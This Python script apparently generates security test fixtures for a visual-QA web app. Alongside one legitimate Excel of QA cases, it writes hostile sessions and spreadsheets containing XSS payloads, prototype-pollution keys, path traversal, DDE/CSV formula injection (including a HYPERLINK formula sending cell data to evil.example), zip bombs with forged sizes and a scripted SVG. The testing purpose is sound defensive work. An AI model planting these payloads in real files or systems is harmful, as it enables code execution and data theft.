#!/usr/bin/env python3
"""
Genera las hojas de cálculo de prueba:

* `escenarios-prueba.xlsx`  — un Excel de casos realista, con encabezados en
  español y una columna propia, para probar la detección de columnas.
* `attack/…`                — los archivos hostiles: sesiones envenenadas,
  fórmulas inyectadas, bombas zip, SVG con script e imágenes desmesuradas.

Las imágenes y el PDF de prueba los genera `make-fixtures.js` (necesita navegador).
"""
import json, pathlib, struct, zipfile, io
import openpyxl

HERE = pathlib.Path(__file__).parent
ATK = HERE / 'attack'
ATK.mkdir(exist_ok=True)

# ------------------------------------------------- Excel de escenarios legítimo
wb0 = openpyxl.Workbook(); ws0 = wb0.active; ws0.title = 'Casos QA'
ws0.append(['Código', 'Pantalla', 'Caso de prueba', 'Criterio de aceptación',
            'Prioridad', 'Frame de Figma', 'Responsable'])
for fila in [
    ['QA-01', 'Home', 'Header: logo, menú y botón principal', 'Posición, tamaño y color idénticos al frame', 'Alta', 'Home/Desktop', 'Carlos'],
    ['QA-02', 'Home', 'Hero: título y subtítulo', 'Tipografía, tamaño e interlineado según diseño', 'Alta', 'Home/Desktop', 'Carlos'],
    ['QA-03', 'Home', 'Botón «Crear cuenta»', 'Color, radio y padding exactos', 'Media', 'Home/Desktop', 'Carlos'],
    ['QA-04', 'Home', 'Grilla de 3 tarjetas', 'Separación de 22 px y mismos iconos', 'Media', 'Home/Desktop', 'Ana'],
    ['QA-05', 'Home', 'Footer', 'Texto y colores según diseño', 'Baja', 'Home/Desktop', 'Ana'],
    ['QA-06', 'Login', 'Campos del formulario', 'Alto, borde y radio iguales al diseño', 'Alta', 'Login/Estados', 'Carlos'],
    ['QA-07', 'Login', 'Mensaje de error de contraseña', 'Texto exacto y color #D92C3C', 'Alta', 'Login/Estados', 'Carlos'],
    ['QA-08', 'Login', 'Botón «Entrar»', 'Ancho completo y color primario', 'Media', 'Login/Estados', 'Ana'],
    ['QA-09', 'Responsive', 'Home a 768 px', 'Respeta el frame Home/Tablet', 'Alta', 'Home/Tablet', 'Ana'],
    ['QA-10', 'Responsive', 'Home a 390 px', 'Respeta el frame Home/Mobile', 'Crítica', 'Home/Mobile', 'Carlos'],
]:
    ws0.append(fila)
wb0.save(HERE / 'escenarios-prueba.xlsx')
print('escenarios-prueba.xlsx')

# ------------------------------------------------------------ cargas hostiles
XSS = [
    '<img src=x onerror="window.__pwned=1">',
    '"><script>window.__pwned=1</script>',
    "');window.__pwned=1;//",
    '<svg/onload=window.__pwned=1>',
    'javascript:window.__pwned=1',
    '<iframe src="https://evil.example/steal"></iframe>',
]

# ---------------------------------------------------------------- sesión hostil
ses = HERE / 'out' / 'sesion.json'
base = json.loads(ses.read_text(encoding='utf-8')) if ses.exists() else {'design': [], 'web': []}

eviljson = {
    'app': 'qa-visual-check', 'version': '1.0', 'savedAt': '2026-01-01T00:00:00Z',
    '__proto__': {'polluted': 'si', 'isAdmin': True},
    'constructor': {'prototype': {'polluted2': 'si'}},
    'meta': {
        'project': XSS[0], 'client': XSS[1], 'tester': XSS[2], 'date': XSS[3],
        'url': XSS[4], 'browser': XSS[5], 'viewport': XSS[0],
        'figma': XSS[1], 'notes': XSS[2], '__proto__': {'polluted3': 'si'},
    },
    'ui': {'mode': '<script>', 'tool': 'x', 'theme': 'evil', 'threshold': 1e12,
           'opacity': -999, 'liveDiff': 'si', 'curtain': 'NaN', 'scPage': -5, 'scPageSize': 1e9},
    'counters': {'finding': 'mucho', 'pair': None},
    'design': [
        {'id': '../../etc/passwd', 'name': XSS[0], 'w': 'x', 'h': None,
         'origin': 'file', 'thumb': 'javascript:window.__pwned=1',
         'src': 'data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19wd25lZD0xPC9zY3JpcHQ+'},
        {'id': 'd2', 'name': 'normal', 'w': 100, 'h': 100, 'origin': 'file',
         'thumb': None, 'src': 'x" onerror="window.__pwned=1'},
        {'id': 'd3', 'name': 'con imagen válida', 'w': 4, 'h': 4, 'origin': 'file',
         'thumb': None, 'src': (base['design'][0]['src'] if base.get('design') and base['design'][0].get('src') else None)},
    ],
    'web': [{'id': 'w1', 'name': XSS[3], 'w': 10, 'h': 10, 'origin': '<script>', 'thumb': None,
             'src': (base['web'][0]['src'] if base.get('web') and base['web'][0].get('src') else None)}],
    'pairs': [{'id': 'p1', 'name': XSS[0], 'designId': 'd3', 'webId': 'w1',
               'scale': 1e9, 'offx': 'x', 'offy': None,
               'masks': [{'x': 'a', 'y': 'b', 'w': 1e12, 'h': -5}] * 5,
               'diff': {'pct': 'mucho', 'count': -1, 'area': None, 'regions': 1e9,
                        'threshold': 999, 'ts': 'ayer'},
               'diffThumb': 'data:image/svg+xml;base64,PHN2Zy8+'}],
    'scenarios': [
        {'id': 's1', 'code': XSS[0], 'module': XSS[1], 'name': XSS[2], 'steps': XSS[3],
         'expected': XSS[4], 'priority': XSS[5], 'ref': XSS[0], 'status': '<script>',
         'severity': 'Crítica-falsa', 'note': XSS[1], 'evidence': 'data:text/html,<script>1</script>',
         'extra': {'__proto__': 'si', 'constructor': 'si', XSS[0]: XSS[1]}},
        {'id': 's2', 'code': 'OK-1', 'module': 'Home', 'name': 'escenario legítimo',
         'expected': 'debe verse igual', 'priority': 'Alta', 'ref': 'Home',
         'status': 'OK', 'severity': '', 'note': '', 'evidence': None, 'extra': {}},
    ],
    'findings': [
        {'id': 'f1', 'code': XSS[0], 'title': XSS[1], 'desc': XSS[2] + '\n' + XSS[3],
         'category': '<script>', 'severity': 'Apocalíptica', 'state': 'Hackeado',
         'pairId': 'p1', 'pairName': XSS[4],
         'rect': {'x': 'x', 'y': None, 'w': 1e12, 'h': -3},
         'evidence': 'data:image/png;base64,AAAA" onerror="window.__pwned=1',
         'scenarioCode': XSS[5], 'createdAt': XSS[0]},
    ],
    'activePairId': 'p1',
}
# texto gigantesco: debe recortarse, no colgar el navegador
eviljson['scenarios'].append({'id': 's3', 'code': 'BIG', 'module': 'x',
                              'name': 'A' * 2_000_000, 'expected': 'B' * 2_000_000,
                              'note': 'C' * 2_000_000, 'status': 'Pendiente',
                              'severity': '', 'ref': '', 'steps': '', 'priority': '', 'extra': {}})
(ATK / 'sesion-maliciosa.json').write_text(json.dumps(eviljson), encoding='utf-8')

# arreglo en lugar de objeto / app equivocada
(ATK / 'sesion-no-valida.json').write_text('[1,2,3]', encoding='utf-8')
(ATK / 'sesion-otra-app.json').write_text('{"app":"otra-cosa","scenarios":[]}', encoding='utf-8')

# ------------------------------------------------- Excel con inyección de fórmulas
wb = openpyxl.Workbook(); ws = wb.active; ws.title = 'Casos'
ws.append(['ID', 'Módulo', 'Escenario', 'Resultado esperado', 'Prioridad', '__proto__'])
ws.append(['=cmd|\' /C calc\'!A0', '@SUM(1+1)*cmd|\' /C calc\'!A0',
           '=HYPERLINK("http://evil.example?d="&A1,"Haz clic")',
           '+1+1', '-2+3', 'contaminado'])
ws.append(['INY-2', 'Home', '<img src=x onerror="window.__pwned=1">',
           '<script>window.__pwned=1</script>', 'Alta', 'x'])
ws.append(['INY-3', 'Login', '=1+1', 'texto normal', 'Media', 'y'])
wb.save(ATK / 'excel-inyeccion.xlsx')

# ------------------------------------------------------------------ bombas zip
def build_xlsx_with(shared_bytes, path, lie_uncompressed=None):
    """xlsx mínimo cuyo sharedStrings.xml es enorme."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('[Content_Types].xml',
                   '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                   '<Default Extension="xml" ContentType="application/xml"/>'
                   '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                   '</Types>')
        z.writestr('_rels/.rels',
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'
                   '</Relationships>')
        z.writestr('xl/workbook.xml',
                   '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
                   'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
                   '<sheets><sheet name="H" sheetId="1" r:id="rId1"/></sheets></workbook>')
        z.writestr('xl/_rels/workbook.xml.rels',
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
                   '</Relationships>')
        z.writestr('xl/worksheets/sheet1.xml',
                   '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                   '<sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row></sheetData></worksheet>')
        z.writestr('xl/sharedStrings.xml', shared_bytes)
    data = bytearray(buf.getvalue())

    if lie_uncompressed is not None:
        # falsea el tamaño descomprimido declarado para sharedStrings.xml
        name = b'xl/sharedStrings.xml'
        eocd = data.rfind(b'PK\x05\x06')
        cd_off = struct.unpack_from('<I', data, eocd + 16)[0]
        off = cd_off
        while off < eocd and data[off:off+4] == b'PK\x01\x02':
            nlen = struct.unpack_from('<H', data, off + 28)[0]
            elen = struct.unpack_from('<H', data, off + 30)[0]
            clen = struct.unpack_from('<H', data, off + 32)[0]
            if data[off+46:off+46+nlen] == name:
                struct.pack_into('<I', data, off + 24, lie_uncompressed)   # central
                local = struct.unpack_from('<I', data, off + 42)[0]
                struct.pack_into('<I', data, local + 22, lie_uncompressed) # local
                break
            off += 46 + nlen + elen + clen
    pathlib.Path(path).write_bytes(bytes(data))

huge = '<?xml version="1.0"?><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"><si><t>' \
       + 'A' * 120_000_000 + '</t></si></sst>'
build_xlsx_with(huge, ATK / 'zip-bomb-declarada.xlsx')
build_xlsx_with(huge, ATK / 'zip-bomb-mentirosa.xlsx', lie_uncompressed=900_000)

# ------------------------------------------------------------ SVG con script
svg = ('<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300">'
       '<script>window.__pwned=1</script>'
       '<image href="https://evil.example/pixel.png" x="0" y="0" width="10" height="10"/>'
       '<foreignObject width="400" height="300"><body xmlns="http://www.w3.org/1999/xhtml">'
       '<img src="x" onerror="window.__pwned=1"/></body></foreignObject>'
       '<rect width="400" height="300" fill="#4c8dff"/></svg>')
(ATK / 'diseno-con-script.svg').write_text(svg, encoding='utf-8')

# ------------------------------------------------ imagen fuera de rango (muy ancha)
from PIL import Image
Image.new('RGB', (20100, 8), '#ff0000').save(ATK / 'imagen-desmesurada.png')

# --------------------------------------------------------------- CSV hostil
(ATK / 'escenarios-inyectados.csv').write_text(
    'ID;Módulo;Escenario;Resultado esperado;Prioridad\n'
    '=cmd|\' /C calc\'!A0;Home;"=HYPERLINK(""http://evil.example"",""clic"")";@SUM(A1);Alta\n'
    'CSV-2;Login;<script>window.__pwned=1</script>;normal;Media\n', encoding='utf-8')

print('fixtures de ataque en', ATK)
for f in sorted(ATK.iterdir()):
    print(f'  {f.name:34} {f.stat().st_size/1024:9.1f} KB')
